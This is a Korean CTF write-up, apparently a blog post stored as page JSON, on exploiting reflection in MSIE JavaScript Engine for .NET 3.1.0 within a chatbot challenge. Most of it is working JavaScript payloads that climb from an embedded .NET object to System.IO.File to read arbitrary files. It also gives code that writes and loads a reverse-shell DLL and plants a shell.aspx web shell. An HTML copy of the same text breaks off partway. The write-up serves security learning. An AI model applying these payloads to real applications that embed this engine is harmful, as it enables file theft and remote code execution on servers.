{"pageProps":{"post":{"title":"NET에 맞는 JavaScript 엔진 활용 방법","description":"","date":"2024-06-30 18:26","slug":"2024-06-30-ExploitingaJavaScriptEngineforNET","content":"\n\n이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.\n\n도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.\n\n## 도전 설명\n\n![도전 설명](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png)\n\n<div class=\"content-ad\"></div>\n\n도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.\n\n![이미지1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png)\n\n![이미지2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png)\n\n간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.\n\n<div class=\"content-ad\"></div>\n\n## 어플리케이션 이해하기\n\n첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.\n\nJavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png)\n\n<div class=\"content-ad\"></div>\n\n보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png\" />\n\n이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var objs = [];\n        for (var obj in this) {\n            objs.push(obj);\n        }\n        return \"Objects: \" + objs.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot 1](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png)\n\n우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:\n\n```js\nthis.ProcessChat_Helper \n```\n\n![Screenshot 2](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png)\n\n\n<div class=\"content-ad\"></div>\n\n결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.\n\n```js\nvar jsObject = {};\nthis.jsObject\n```\n\n![image](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png)\n\n그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:\n\n<div class=\"content-ad\"></div>\n\n```js\n// 코드 조각. \nusing (var engine = new MsieJsEngine())\n{\n  // C# 객체를 JavaScript 컨텍스트에 노출\n  engine.EmbedHostObject(\"ProcessChat_Helper\", ProcessChatHelperObject);\n  // 스크립트를 평가\n  var result = engine.Evaluate<string>(script);\n}\n```\n\n## C#에서의 Reflection\n\nProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png\" />\n\n\n<div class=\"content-ad\"></div>\n\n릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:\n\n![이미지](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png)\n\n간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:\n\n```js\nfunction processMessage(message) {\n    try {\n        var methods = [];\n        var processChatHelper = this[\"ProcessChat_Helper\"];\n        if (processChatHelper !== undefined) {\n            methods.push(\"Methods: \" + Object.getOwnPropertyNames(processChatHelper).join(\", \"));\n        }\n        return \"\" + methods.join(\", \");\n    } catch (e) {\n        return \"Error: \" + e.message;\n    }\n}\nvar response = processMessage(message);\nresponse;\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png)\n\n해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.\n\n```js\nthis.ProcessChat_Helper.GetHashCode()\n```\n\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png)\n\n\n<div class=\"content-ad\"></div>\n\n## 타입 및 메서드\n\nGetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:\n\n```js\nthis.ProcessChat_Helper.GetAvailableLanguages()\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:\n\n```js\n// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열\nvar len = this.ProcessChat_Helper.GetAvailableLanguages().GetLength(0); // 2\nvar elements = [];\nfor(let i = 0; i < len; i++) {\n  elements.push(this.ProcessChat_Helper.GetAvailableLanguages().GetValue(i));\n}\nelements.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png\" />\n\n지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar methodsArray = this.ProcessChat_Helper.GetAvailableLanguages().GetType().GetMethods(); \nvar len = methodsArray.GetLength(0);\nvar methods = [];\nfor( let i = 0; i < len; i++) {\n   var typeName = methodsArray.GetValue(i).ToString();\n   methods.push(typeName);\n};\nmethods.join(', ')\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png\" />\n\n이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.\n\n```js\nthis.ProcessChat_Helper.GetType().BaseType\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png\" />\n\n## 어셈블리\n\n지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.\n\n다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); // Array length = 2594 :\"D \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   types.push(typesArray.GetValue(i).ToString());\n};\ntypes.join(\", \")\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png\" />\n\n어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.\n\n## 로컬 파일 노출\n\n\n<div class=\"content-ad\"></div>\n\n이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0);\nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.IO.File\"){\n      var index = i;\n      break;\n   }\n};\ntypesArray.GetValue(index).ToString() + \"Type found at index: \" + index\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png\" />\n\n이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar len = fileTypeMethods.GetLength(0);\nvar methods = {};\nfor( let i = 0; i < len; i++) {\n   var methodName = fileTypeMethods.GetValue(i).ToString();\n   if(methodName.includes(\"ReadAllText\")){\n      var index = i;\n      methods[i] = methodName;\n   }\n};\nJSON.stringify(methods)\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png\" />\n\n필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\narg = [\"c:\\\\windows\\\\win.ini\"];\nfileTypeMethods.GetValue(49).Invoke(null, arg)\n```\n\n<div class=\"content-ad\"></div>\n\n\n![2024-06-30-ExploitingaJavaScriptEngineforNET_19](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png)\n\n에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.\n\n그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.\n\n몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar len = typesArray.GetLength(0); \nvar types= [];\nfor( let i = 0; i < len; i++) {\n   var typeName = typesArray.GetValue(i).ToString();\n   if(typeName == \"System.Environment\"){\n      var typeIndex = i;\n      break;\n   }\n};\nvar envType = typesArray.GetValue(typeIndex); // typeIndex = 128 \nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null).GetValue(0); \noneElemArr\n```\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png\" />\n\n이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileReadMethods = typesArray.GetValue(2008).GetMethods();\nvar envType = typesArray.GetValue(128);\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \noneElemArr.SetValue(\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\", 0);\nfileReadMethods.GetValue(49).Invoke(null, oneElemArr)\n```\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png\" />\n\n## 플래그 읽기\n\n이제 도전 과제의 마지막 조각인데요, c:\\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.\n\n디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\r\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\r\nvar typesArray = objectClass.Assembly.GetTypes();\r\nvar len = typesArray.GetLength(0); \r\nvar types = [];\r\nfor( let i = 0; i < len; i++) {\r\n   var typeName = typesArray.GetValue(i).ToString();\r\n   if(typeName == \"System.IO.Directory\"){\r\n      var typeIndex = i;\r\n      break;\r\n   }\r\n};\r\nvar dirTypeMethods = typesArray.GetValue(typeIndex).GetMethods();\r\nvar len = dirTypeMethods.GetLength(0);\r\nvar methods = {};\r\nfor( let i = 0; i < len; i++) {\r\n   var methodName = dirTypeMethods.GetValue(i).ToString();\r\n   if(methodName.includes(\"GetFiles\")){\r\n      var index = i;\r\n      methods[i] = methodName;\r\n   }\r\n};\r\nvar getFilesMethod = dirTypeMethods.GetValue(17); // GetFile(String) at index 17\r\nvar envType = typesArray.GetValue(128);\r\nvar oneElemArr = envType.GetMethod(\"GetCommandLineArgs\").Invoke(null,null); \r\noneElemArr.SetValue(\"C:\\\\Temp\", 0);\r\n// Getting all the filenames in the c:\\\\temp\r\ntempFilesArr = getFilesMethod.Invoke(null, oneElemArr);\r\nvar len = tempFilesArr.GetLength(0);\r\nvar fileReadMethod = typesArray.GetValue(2008).GetMethods().GetValue(49);\r\nfor( let i = 0; i < len; i++) {\r\n   var fileName = tempFilesArr.GetValue(i);\r\n   oneElemArr.SetValue(fileName, 0);\r\n   // the Flag filename contais Flag and some other random values\r\n   if(fileName.includes(\"Flag\")) {\r\n     // read the flag file\r\n     var fileContent = fileReadMethod.Invoke(null, oneElemArr);\r\n     break;\r\n   }\r\n};\r\nfileContent\r\n```\r\n\r\n![Screenshot](/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png)\r\n\r\n## 원격 코드 실행\r\n\r\nRCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.\r\n\n\n<div class=\"content-ad\"></div>\n\nRCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \\x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\temp\\\\z4ki.dll\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 편집하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\nvar assemblyType = objectClass.Assembly.GetType().BaseType\nvar oneElemArr = objectClass.Assembly.GetTypes().GetValue(128).GetMethod(\"GetCommandLineArgs\").Invoke(null,null);\noneElemArr.SetValue(\"C:\\\\Temp\\\\z4ki.dll\",0);\nassemblyType.GetMethod(\"LoadFile\").Invoke(null,oneElemArr);\n```\n\n## 또 다른 RCE 방법\n\n다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nvar objectClass = this.ProcessChat_Helper.GetType().BaseType;\nvar typesArray = objectClass.Assembly.GetTypes();\nvar fileTypeMethods = typesArray.GetValue(2008).GetMethods();\nvar writeFileMethod = fileTypeMethods.GetValue(51);\nvar writeFileArgs = this.ProcessChat_Helper.GetAvailableLanguages();\nwriteFileArgs.SetValue(\"c:\\\\ChatBot\\\\wwwroot\\\\shell.aspx\", 0);\nwriteFileArgs.SetValue(\"\\x7a\\x34\\x6b\\x69\", 1); // <--  여기를 수정하세요\nwriteFileMethod.Invoke(null, writeFileArgs);\n```\n\n이제 http://`ip`/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.\n\n여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.\n","ogImage":{"url":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png"},"coverImage":"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png","tag":["Tech"],"readingTime":15},"content":"<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta content=\"width=device-width, initial-scale=1\" name=\"viewport\">\n</head>\n<body>\n<p>이 블로그는 .NET 라이브러리용 MSIE JavaScript Engine 버전 3.1.0의 구성 오류를 악용하여 로컬 파일 노출, 임의 파일 쓰기, 원격 코드 실행을 달성하는 내용을 다루고 있습니다. 이는 ICMTC CTF 2024 예선에서 어려운 CTF 도전과제였어요. 함께 시작해봅시다.</p>\n<p>도전은 Custom ChatBot 이라 불렸고, 대회에서는 0회 풀렸으며, 저자는 몇 일 동안 도전을 풀고 싶은 사람들을 위해 계속 유지하기로 결정했고, 저는 그에 도전해보았어요. 어떻게 해결했는지 살펴봅시다.</p>\n<h2>도전 설명</h2>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_0.png\" alt=\"도전 설명\"></p>\n<div class=\"content-ad\"></div>\n<p>도전 과제에는 두 가지 중요한 기능이 있었어요. 하나는 JavaScript로 ChatBot을 사용자 정의하는 것이었고, 다른 하나는 ChatBot과 상호 작용하는 것이었죠.</p>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_1.png\" alt=\"이미지1\"></p>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_2.png\" alt=\"이미지2\"></p>\n<p>간단한 기능이 실행되고 우리에게 응답이 전송되었음을 확인할 수 있어요. 도전 과제 설명으로부터, JavaScript 코드의 구문 분석을 처리하는 라이브러리와 라이브러리 버전을 알 수 있었구요. 그래서 제가 한 일은 이미 알려진 취약점이나 CVE를 찾아보는 것이었지만 발견하지 못했어요. 그래서 우리가 주변을 살펴보고 환경을 이해하기 시작할 때가 되었어요.</p>\n<div class=\"content-ad\"></div>\n<h2>어플리케이션 이해하기</h2>\n<p>첫 번째로 해야 할 일은 어떤 문맥에서 실행 중이며 어떤 객체들을 사용할 수 있는지 알아내는 것입니다. 그럴려면 어떻게 해야 할까요? 먼저 떠오르는 것은 this 객체인데, 그 중요성에 대해 간단히 설명해 드리겠습니다.</p>\n<p>JavaScript나 다른 몇몇 프로그래밍 언어에서 this 키워드는 해당 객체를 가리킵니다. 그 값은 사용된 문맥에 따라 달라집니다. 문맥에 대해 더 잘 설명하기 위해, 브라우저 콘솔에서 JavaScript를 실행하는 간단한 예제를 보여 드리겠습니다. 브라우저 콘솔에서 console.log(this)를 실행하면 window 객체를 얻을 수 있고, 그 문맥 안에서 실행 중이므로 window 객체의 속성에 액세스할 수 있습니다.</p>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_3.png\" alt=\"이미지\"></p>\n<div class=\"content-ad\"></div>\n<p>보시다시피 window 객체에서 이용 가능한 많은 멤버들이 있으며 그 중 하나인 document 객체에 접근했습니다. 또한 window 컨텍스트에 정의된 함수에도 접근할 수 있습니다. 예를 들어 atob와 같은 함수가 있습니다.</p>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_4.png\">\n<p>이제 애플리케이션 컨텍스트에서 this 객체를 탐색하고 해당 멤버들을 모두 나열해야 합니다. 아래의 자바스크립트 코드를 사용하여 모든 멤버를 나열할 수 있습니다:</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">processMessage</span>(<span class=\"hljs-params\">message</span>) {\n    <span class=\"hljs-keyword\">try</span> {\n        <span class=\"hljs-keyword\">var</span> objs = [];\n        <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">var</span> obj <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable language_\">this</span>) {\n            objs.<span class=\"hljs-title function_\">push</span>(obj);\n        }\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"Objects: \"</span> + objs.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">\", \"</span>);\n    } <span class=\"hljs-keyword\">catch</span> (e) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"Error: \"</span> + e.<span class=\"hljs-property\">message</span>;\n    }\n}\n<span class=\"hljs-keyword\">var</span> response = <span class=\"hljs-title function_\">processMessage</span>(message);\nresponse;\n</code></pre>\n<div class=\"content-ad\"></div>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_5.png\" alt=\"Screenshot 1\"></p>\n<p>우리가 얻은 결과에는 JavaScript 코드에서 정의하지 않은 ProcessChat_Helper 객체가 포함되어 있었습니다. 그래서 접근해 보려고 했고, 다음과 같은 응답을 받았습니다:</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span> \n</code></pre>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_6.png\" alt=\"Screenshot 2\"></p>\n<div class=\"content-ad\"></div>\n<p>결과에 따르면 이 객체는 jail.Controllers.ProcessChatHelper 클래스의 .Net 객체입니다. 그것이 .Net 객체인지 어떻게 알게 되었을까요? JavaScript 객체를 정의하고 동일한 방식으로 액세스하려고 시도하면 완전히 다른 결과를 얻을 수 있습니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> jsObject = {};\n<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">jsObject</span>\n</code></pre>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_7.png\" alt=\"image\"></p>\n<p>그렇다면 왜 그리고 어떻게 JavaScript 컨텍스트에서 .Net 객체에 액세스할 수 있을까요? 도전 과제의 로컬 복사본을 만들어보는 중에 답을 찾았습니다. 여기에 .Net 객체를 노출하는 코드가 있습니다:</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-comment\">// 코드 조각. </span>\nusing (<span class=\"hljs-keyword\">var</span> engine = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">MsieJsEngine</span>())\n{\n  <span class=\"hljs-comment\">// C# 객체를 JavaScript 컨텍스트에 노출</span>\n  engine.<span class=\"hljs-title class_\">EmbedHostObject</span>(<span class=\"hljs-string\">\"ProcessChat_Helper\"</span>, <span class=\"hljs-title class_\">ProcessChatHelperObject</span>);\n  <span class=\"hljs-comment\">// 스크립트를 평가</span>\n  <span class=\"hljs-keyword\">var</span> result = engine.<span class=\"hljs-property\">Evaluate</span>&#x3C;string>(script);\n}\n</code></pre>\n<h2>C#에서의 Reflection</h2>\n<p>ProcessChat_Helper 객체는 ProcessChatHelper 클래스의 인스턴스이며, 해당 클래스가 어떻게 구현되었는지를 알 수 없기 때문에 객체 내의 공개 메서드를 열거해야 합니다. 하지만 어떻게 그것을 할 수 있을까요? 조금의 검색 끝에 GitHub의 라이브러리 저장소로 이동하여 3.1.0 이후의 릴리스에서 뭔가 이상한 것을 발견했습니다.</p>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_8.png\">\n<div class=\"content-ad\"></div>\n<p>릴리스에 따르면 AllowReflection의 기본값이 이제 기본적으로 false로 설정되어 있습니다. 이것은 v3.1.0에서 그렇지 않았던 것입니다. 그렇다면 Reflection이란 무엇일까요? 제 친구인 ChatGPT에게 물어봤는데, 그는 전체 과정 동안 큰 도움이 되었습니다. 그가 말한 내용은 다음과 같습니다:</p>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_9.png\" alt=\"이미지\"></p>\n<p>간단히 말하자면, 이 설정이 true로 설정된 경우, .Net 객체에 액세스할 수 있다면 해당 클래스의 속성에 액세스하고 런타임 중에 공개 메서드를 실행할 수 있습니다. 그렇다면 ProcessChat_Helper 객체에 어떤 메서드가 있는지 살펴보겠습니다. 다음 코드로 확인할 수 있습니다:</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">processMessage</span>(<span class=\"hljs-params\">message</span>) {\n    <span class=\"hljs-keyword\">try</span> {\n        <span class=\"hljs-keyword\">var</span> methods = [];\n        <span class=\"hljs-keyword\">var</span> processChatHelper = <span class=\"hljs-variable language_\">this</span>[<span class=\"hljs-string\">\"ProcessChat_Helper\"</span>];\n        <span class=\"hljs-keyword\">if</span> (processChatHelper !== <span class=\"hljs-literal\">undefined</span>) {\n            methods.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-string\">\"Methods: \"</span> + <span class=\"hljs-title class_\">Object</span>.<span class=\"hljs-title function_\">getOwnPropertyNames</span>(processChatHelper).<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">\", \"</span>));\n        }\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span> + methods.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">\", \"</span>);\n    } <span class=\"hljs-keyword\">catch</span> (e) {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"Error: \"</span> + e.<span class=\"hljs-property\">message</span>;\n    }\n}\n<span class=\"hljs-keyword\">var</span> response = <span class=\"hljs-title function_\">processMessage</span>(message);\nresponse;\n</code></pre>\n<div class=\"content-ad\"></div>\n<p><img 